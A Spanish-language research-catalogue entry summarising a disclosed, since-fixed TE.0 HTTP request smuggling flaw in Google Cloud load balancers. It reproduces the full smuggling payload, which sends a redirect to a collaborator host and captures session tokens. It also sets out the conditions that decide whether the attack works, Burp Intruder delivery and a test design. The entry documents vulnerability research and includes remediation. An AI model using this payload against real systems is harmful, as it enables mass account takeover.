---
clase: protocolo
tech: google-cloud-lb
cwe: CWE-444
cvss: 9.3 # [derivado] recompensa $8,500; la fuente lo describe como 'mass 0-click account takeover'
payload: |
  # ADVERTENCIA DE PROCEDENCIA: la fuente llama a esto 'a payload similar to this one',
  # asi que puede NO ser los bytes exactos del ataque original. Los saltos de linea SI
  # se conservaron en el render (cada linea es un code-span con salto forzado).
  # 'EMPTY_LINE_HERE' es un MARCADOR LITERAL de la propia fuente para dos lineas vacias.
  #
  OPTIONS / HTTP/1.1
  Host: {HOST}
  Accept-Encoding: gzip, deflate, br
  Accept: */*
  Accept-Language: en-US;q=0.9,en;q=0.8
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
  Transfer-Encoding: chunked
  Connection: keep-alive

  50
  GET <http://our-collaborator-server/> HTTP/1.1
  x: X
  0
  EMPTY_LINE_HERE
  EMPTY_LINE_HERE
  #
  # DETALLES QUE DECIDEN SI FUNCIONA:
  # - Transfer-Encoding: 'chunked' SIN OFUSCAR. No es una variante TE.TE.
  # - No hay cabecera Content-Length.
  # - Metodo: cita LITERAL de la fuente: 'The exploit we showcased ... only worked with
  #   the OPTIONS method, as it was failing both with GET and POST.'
  # - Tamaño de chunk: '50'. Nota LITERAL: 'The chunk length ... has to be a hex number.'
  #   y el consejo de la fuente: 'Make sure the size is correct.'
  #
  # ADVERTENCIA ARITMETICA: '50' hex declara 80 bytes, pero el contenido entre el '50' y
  # el '0' suma ~54 con CRLF. La discrepancia esta en la fuente y la fuente no la
  # explica. Verificar contra el original antes de usar esto como vector de prueba.
  #
  # ENTREGA: Burp Intruder con 'null payloads', repitiendo la peticion.
precondicion: "El balanceador de carga de Google Cloud configurado para usar HTTP/1.1 por defecto en lugar de HTTP/2. Cita LITERAL: 'the GCP load balancer had to be configured to default to HTTP/1.1 instead of HTTP/2', y 'many hosts were still defaulting to the old version of the HTTP protocol — thousands of them, in fact.'"
como_se_descubre: |
  La aportacion conceptual de la fuente es una PREGUNTA, no una tecnica. Taxonomia que
  establece: CL.TE, TE.CL, TE.TE y CL.0 ('The back-end ignores the Content-Length header
  (which is treated as 0), but the front-end parses it'). Y entonces pregunta,
  literalmente: 'why is there no TE.0?'
  Respuesta: podria funcionar igual que CL.0 'but using Transfer-Encoding instead'.
  ADVERTENCIA: la fuente NUNCA da una definicion de TE.0 en una frase, y NO detalla el
  comportamiento del back-end con esas palabras. Que el front-end parsee el chunked y
  el back-end ignore TE es una LECTURA de la analogia, no una cita.
  La leccion de metodologia: la vulnerabilidad se encontro completando una TABLA. Las
  combinaciones conocidas dejaban un hueco con nombre obvio, y nadie lo habia probado.
  Enumerar sistematicamente el espacio de una taxonomia es una tecnica de
  descubrimiento por derecho propio.
  Fingerprint de GCP durante el barrido: 'Via: 1.1 google' y, para IAP,
  'Invalid IAP credentials: empty token'.
control_negativo: |
  # [derivado] diseño de test A/B — IMPRESCINDIBLE porque la fuente NO da sonda
  # de deteccion ni respuesta de confirmacion.
  # A: la peticion OPTIONS de arriba, repetida -> redireccion a dominio del atacante
  # B: la misma con metodo GET o POST -> segun la fuente, FALLA. Es control de que el
  #    metodo importa, no decoracion.
  # C: la misma con Transfer-Encoding eliminado -> sin desync
  # El par A/C aisla la cabecera TE como causa. El par A/B documenta la restriccion de
  # metodo, que es el detalle que mas reproducciones arruina.
  # NOTA HONESTA: la fuente no publica ni sonda ni respuestas de confirmacion; las
  # capturas de la toma de cuenta y de las cabeceras son IMAGENES. Este control es
  # enteramente derivado.
mata: |
  - El balanceador usa HTTP/2 por defecto -> la precondicion desaparece.
  - Metodos GET o POST en lugar de OPTIONS (declarado por la fuente).
  - Tamaño de chunk incorrecto (ver advertencia aritmetica).
  - Google ya lo corrigio: la cronologia indica que reconocio el 2024-05-02 haberlo
    arreglado tras un ticket de cliente.
fuente: "https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/ (2024-07-17, 'By Guest Post'). Autores: Paolo Arnolfo (@sw33tLie), Guillermo Gregorio (@bsysop) y un tercero cuyo nombre la propia pagina REDACTA, dejando solo @_medusa_1_. Votada tecnica nº3 de 2024. Recompensa LITERAL: 'Google rewarded us with a bounty of $8,500.' SIN CVE en el cuerpo. Los mismos investigadores estan acreditados en el caso de GitLab de writeups/protocolo/expect-obfuscado-0cl-gitlab-rqp.md."
confianza: media
fecha: 2026-11-02
---
# [PROTOCOLO] TE.0 request smuggling — completar la tabla encontró miles de sitios de Google Cloud

## Principio
La aportación de este trabajo empieza como una **pregunta sobre una taxonomía**. Las
variantes conocidas eran CL.TE, TE.CL, TE.TE y CL.0 — esta última definida literalmente
como *"The back-end ignores the `Content-Length` header (which is treated as 0), but the
front-end parses it."*

Y entonces los autores preguntan: *"why is there no TE.0?"*

La respuesta es que podría funcionar igual que CL.0 *"but using Transfer-Encoding
instead"*. Resultó que sí, y que afectaba a miles de sitios.

## La lección de metodología
La vulnerabilidad se encontró **completando una tabla**. Las combinaciones documentadas
dejaban un hueco con nombre obvio, y nadie lo había probado. Enumerar sistemáticamente el
espacio de una taxonomía es una técnica de descubrimiento por derecho propio — y es
barata, porque el trabajo intelectual ya estaba hecho por quienes nombraron las otras
variantes.

## Payload
```http
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```

`EMPTY_LINE_HERE` es un marcador **literal de la propia fuente** para dos líneas vacías.

## Tres detalles que deciden si funciona
1. **`Transfer-Encoding: chunked` sin ofuscar.** No es una variante TE.TE; no hay truco en
   la cabecera.
2. **Solo `OPTIONS`.** Cita literal: *"The exploit we showcased ... only worked with the
   OPTIONS method, as it was failing both with GET and POST."* Probar con `GET` y concluir
   que el objetivo no es vulnerable es el error más fácil de cometer aquí.
3. **El tamaño de chunk tiene que ser correcto**, en hexadecimal. El propio consejo de la
   fuente es *"Make sure the size is correct."*

## Advertencia aritmética honesta
`50` en hexadecimal declara 80 bytes, pero el contenido entre el `50` y el `0` suma unos
54 con CRLF. **La discrepancia está en la fuente y la fuente no la explica.** Y la propia
página llama al bloque *"a payload similar to this one"*, así que puede no ser los bytes
exactos del ataque original.

Hay que verificarlo contra el original antes de usarlo como vector de prueba. De ahí
`confianza: media`, y de ahí que el control negativo de este writeup sea enteramente
derivado: **la fuente no publica ni sonda de detección ni respuestas de confirmación** —
las capturas de la toma de cuenta y de las cabeceras son imágenes.

## Impacto
Cita literal: el PoC *"achieves a site-wide redirect to an attacker-controlled domain"*,
con el efecto secundario de *"sending us the users' session token"*, lo que la fuente
describe como un *"mass 0-click account takeover"*. Más bypass de autorización en
Identity-Aware Proxy: *"We can bypass the authorization without user interaction."*

Recompensa: **$8.500**. Sin CVE.

## Nota sobre la gestión del reporte
La cronología de la fuente merece recogerse: reportado el 23 de abril, triado el 24,
**cerrado el 25 como no reproducible**, confirmado el 29 como no corregido y no
reproducible, y reabierto el 2 de mayo reconociendo que *"this was indeed an issue they
had fixed after receiving a separate customer ticket"*. Google se disculpó por la mala
gestión.

Es un recordatorio útil para quien reporta: un "no reproducible" no siempre significa que
el hallazgo sea falso.

## Remediación
La fuente no tiene sección de remediación ni guía para defensores. La precondición es
configuración: usar HTTP/2 por defecto en el balanceador elimina el escenario, lo que
coincide con la recomendación estructural de toda esta carpeta.
